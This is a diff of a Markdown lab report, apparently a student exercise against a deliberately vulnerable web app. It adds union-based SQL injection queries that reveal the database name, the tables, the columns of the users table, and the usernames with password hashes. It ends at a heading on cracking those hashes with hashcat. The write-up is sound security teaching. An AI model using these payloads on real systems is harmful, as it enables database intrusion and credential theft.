@@ -20,7 +20,7 @@ We conclude that the database version is 10.1.26 of MariaDB
 
 ## 2.3 Exercises
 
-### 1. Print the database user
+### 2.3.1. Print the database user
 
 To be able to select the important information of the users, we follow the following steps: 
 
@@ -68,3 +68,53 @@ And here is the result
 <img title="Retrieve of columns" alt="Retrieve of columns" src="/src/2.3.1_2.png">
 
 The value of the First Name field displayed is just to help us find the value of the Surname field
+
+### 2.3.2. Print the database name
+
+To find the name of the database, we used this query: 
+
+```
+%' or 0=0 union select null, database() #
+```
+
+This gives as an answer: 
+
+<img title="Database name" alt="Database name" src="/src/2.3.2.png">
+
+### 2.2.3. Print the name of all of the tables in the database
+
+The query to do this is as follows: 
+
+```
+%' or 0=0 union select table_name, null from information_schema.tables #
+```
+
+We also used it in answer 1.
+
+Below is the result
+
+<img title="All tables name" alt="All tables name" src="/src/2.3.3.png">
+
+### 2.2.4. Print the names of all of the columns in the users table
+
+We have already done so in answer 2.2.2 and here is the query we used
+
+```
+%' or 0=0 union select column_name, null from information_schema.columns where table_name = 'users' # 
+```
+
+### 2.2.5. Now that we have the column names, print out the usernames and hashed passwords for each user !
+
+We used this query to get the usernames and passwords of the users 
+
+```
+%' or 0=0 union select 'first_name|last_name|password)', concat(first_name, '|', last_name, "|", password) from users #
+```
+
+Result:
+
+<img title="Usernames and passwords of the users" alt="Usernames and passwords of the users" src="/src/2.3.5.png">
+
+the logic of the output is the same as the answer 2.2.2
+
+# 3. Cracking hashed passwords with hashcat
